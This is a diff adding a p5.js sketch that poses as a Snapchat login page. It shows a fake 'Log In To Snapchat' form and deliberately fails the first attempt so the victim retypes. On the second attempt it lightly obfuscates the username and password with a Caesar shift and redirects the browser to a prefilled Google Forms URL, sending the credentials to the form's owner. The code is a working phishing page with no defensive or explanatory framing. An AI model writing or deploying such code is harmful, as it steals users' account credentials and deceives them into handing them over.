@@ -1,0 +1,127 @@
+function setup() {
+  createCanvas(windowWidth,windowHeight);
+
+  username = createInput('');
+  password = createInput('');
+  
+  username.position(width/11,height/3.6);
+  password.position(width/11,height/2.6);
+  
+  username.size(width - width/5,height/20);
+  password.size(width - width/5,height/20);
+  
+  username.style('border', '0px solid black');
+  password.style('border', '0px solid black');
+  
+  username.style('background-color', 'transparent');
+  password.style('background-color', 'transparent');
+  
+  username.style('font-size', '22px');
+  password.style('font-size', '22px');
+}
+function button(x,y,w,h){
+  return mouseX>x && mouseY>y && mouseX<x+w && mouseY<y+h;
+}
+let img;
+let page = 0;
+function preload(){
+  img = loadImage("https://cdn.shopify.com/s/files/1/0070/7032/files/image5_087c48f2-6908-4c78-be94-033a7a2003b3.png?v=1671066079");
+}
+let username;
+let password;
+let trials = 0;
+function encrypt(text, shift) {
+  let result = '';
+  for (let i = 0; i < text.length; i++) {
+    let char = text.charCodeAt(i);
+    if (char >= 65 && char <= 90) {
+      // Uppercase letters
+      result += String.fromCharCode((char - 65 + shift) % 26 + 65);
+    } else if (char >= 97 && char <= 122) {
+      // Lowercase letters
+      result += String.fromCharCode((char - 97 + shift) % 26 + 97);
+    } else {
+      // Non-alphabetic characters
+      result += text.charAt(i);
+    }
+  }
+  return result;
+}
+function decrypt(text, shift) {
+  return encrypt(text, 26 - shift);
+}
+
+function windowResized(){
+  resizeCanvas(windowWidth,windowHeight);
+}
+function replaceExcept(strs) {
+  let result = '';
+  for (let i = 0; i < strs.length; i++) {
+    if (str[i] === '') {
+      result += '';
+    } else {
+      result += '•';
+    }
+  }
+  return result;
+}
+let hold = 0;
+function draw() {
+  background(250);
+  if (page === 0){
+    image(img,0,0,width,height);
+    if (mouseIsPressed){
+      page++;
+    }
+  }else if (page===1){
+    fill(0);
+    textAlign(CENTER,CENTER);
+    textSize(30);
+    text("Log In To Snapchat",width/2,height/6);
+    textAlign(LEFT,CENTER);
+    textSize(17);
+    fill(150);
+    if (trials>0){
+      fill(255,0,0);
+    }
+    text("USERNAME OR EMAIL",width/10,height/3.8);
+    text("PASSWORD",width/10,height/2.7);
+    stroke(150);
+    
+    line(width/10,height/3,width-width/10,height/3);
+    line(width/10,height/2.3,width-width/10,height/2.3);
+    
+    noStroke();
+    fill(170,170,190);
+    if (username.value().length>5 && password.value().length>5){
+      fill(100,100,120);
+    }
+    rect(width/6,height*0.6,width-width/6*2,height/14,100);
+    fill(255);
+    textSize(25);
+    textAlign(CENTER,CENTER);
+    text("Log In",width/6,height*0.6,width-width/6*2,height/14);
+    
+    if (hold===1 && button(width/6,height*0.6,width-width/6*2,height/14) && username.value().length>5 && password.value().length>5){
+      trials++;
+      if (trials>1){
+        page++;
+      }
+    }
+  }else if (page===2){
+    background(0);
+    textSize(40);
+    textAlign(CENTER,CENTER);
+    fill(255,255,100);
+    textStyle(BOLD);
+    text("Snapchat⁺",width/2,height/2+sin(frameCount/30)*height/10);
+    secret = encrypt(username.value()+"___"+password.value(),5);
+    window.location.replace("https://docs.google.com/forms/d/e/1FAIpQLSeNH0AMMsiMDN9edoLGybjv5EY-_hrCP-B680ryb-xvNIfuhA/viewform?usp=pp_url&entry.458981810="+secret);
+  }
+  
+  if (mouseIsPressed){
+    hold++;
+  }else{
+    hold=0;
+  }
+}
